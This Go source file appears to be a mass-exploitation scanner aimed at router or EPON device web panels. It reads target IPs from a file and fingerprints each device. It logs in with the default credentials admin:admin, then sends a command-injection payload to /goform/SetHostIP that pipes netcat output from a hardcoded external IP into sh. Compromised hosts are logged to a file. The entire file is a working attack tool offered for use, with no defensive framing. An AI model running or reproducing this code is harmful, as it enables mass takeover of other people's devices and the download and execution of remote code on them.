package main

import (
	"bufio"
	"encoding/base64"
	"fmt"
	"net"
	"os"
	"runtime"
	"strconv"
	"strings"
	"sync"
	"time"
)

var (
	total     int
	found     int
	logined   int
	exploited int

	wg sync.WaitGroup

	search_string = "-System" //query too

	ByteSize = 1024

	ServerIp = "2.59.254.252"

	user_agent = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/110.0.0.0 Safari/537.36"
	payload    = "$(nc+" + ServerIp + "+2|sh)"
	form       = "IP=192.168.0.88&NM=1.1.1.1" + payload + "&GW=192.168.0.1"
)

var logins = [...]string{"admin:admin"}

func get_buf(conn net.Conn) string {
	buf := make([]byte, ByteSize)
	conn.Read(buf)

	return string(buf)
}

func sendLog(name, aval string) {
	file, err := os.OpenFile(name, os.O_APPEND|os.O_CREATE|os.O_WRONLY, 0644)
	if err != nil {
		return
	}

	defer file.Close()

	file.WriteString(aval)
}

func check_host(host string) bool {
	conn, err := net.Dial("tcp", host)
	if err != nil {
		return false
	}

	defer conn.Close()

	fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nConnection: close\r\n\r\n", host, user_agent)

	buf := get_buf(conn)

	return strings.Contains(buf, search_string)
}

func check_login(host string) string {
	for i := 0; i < len(logins); i++ {
		conn, err := net.Dial("tcp", host)
		if err != nil {
			return "error"
		}

		auth := base64.StdEncoding.EncodeToString([]byte(logins[i]))

		fmt.Fprintf(conn, "GET / HTTP/1.1\r\nHost: %s\r\nUser-Agent: %s\r\nAuthorization: Basic %s\r\n\r\n", host, user_agent, auth)

		buf := get_buf(conn)

		if strings.Contains(buf, "200 OK") {
			return logins[i]
		}
	}

	return "error"
}

func process_host(host string) {
	total++

	wg.Add(1)

	defer wg.Done()

	if !check_host(host) {
		return
	}

	found++

	auth := check_login(host)

	if auth == "error" {
		return
	}

	logined++

	bauth := base64.StdEncoding.EncodeToString([]byte(auth))

	conn, err := net.Dial("tcp", host)
	if err != nil {
		return
	}

	defer conn.Close()

	fmt.Fprintf(conn, "POST /goform/SetHostIP HTTP/1.1\r\nHost: %s\r\nAuthorization: Basic %s\r\nUser-Agent: %s\r\nContent-Length: %d\r\nContent-Type: application/x-www-form-urlencoded\r\nCache-Control: max-age=0\r\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\r\nAccept-encoding: gzip, deflate\r\nAccept-Language: en-US,en;q=0.9\r\nConnection: close\r\nReferer: http://%s/host_ip.asp\r\n\r\n%s", host, bauth, user_agent, len(form), host, form)

	buf := get_buf(conn)

	if strings.Contains(buf, "HTTP/1.0 302 Redirect") {
		fmt.Printf("exploited %s (%s %s)\r\n", host, auth, bauth)
		sendLog("epon.log", host+"\r\n")
		exploited++
	}

}

func title_writer() {
	i := 0

	for {
		time.Sleep(1 * time.Second)

		fmt.Printf("[%d's] Total [%d] - Found [%d] - Logins [%d] - Exploited [%d]\r\n", i, total, found, logined, exploited)
		i++
	}
}

func main() {
	go title_writer()

	// Открываем файл ip.txt
	file, err := os.Open("ip.txt")
	if err != nil {
		fmt.Printf("Ошибка при открытии файла ip.txt: %v\n", err)
		return
	}
	defer file.Close()

	scan := bufio.NewScanner(file)

	runtimeMax, _ := strconv.Atoi(os.Args[2])

	for scan.Scan() {
		for runtime.NumGoroutine() > runtimeMax {
			time.Sleep(1 * time.Second)
		}

		if os.Args[1] == "manual" {
			go process_host(scan.Text())
		} else {
			go process_host(scan.Text() + ":" + os.Args[1])
		}
	}

	time.Sleep(10 * time.Second)
	wg.Wait()
}
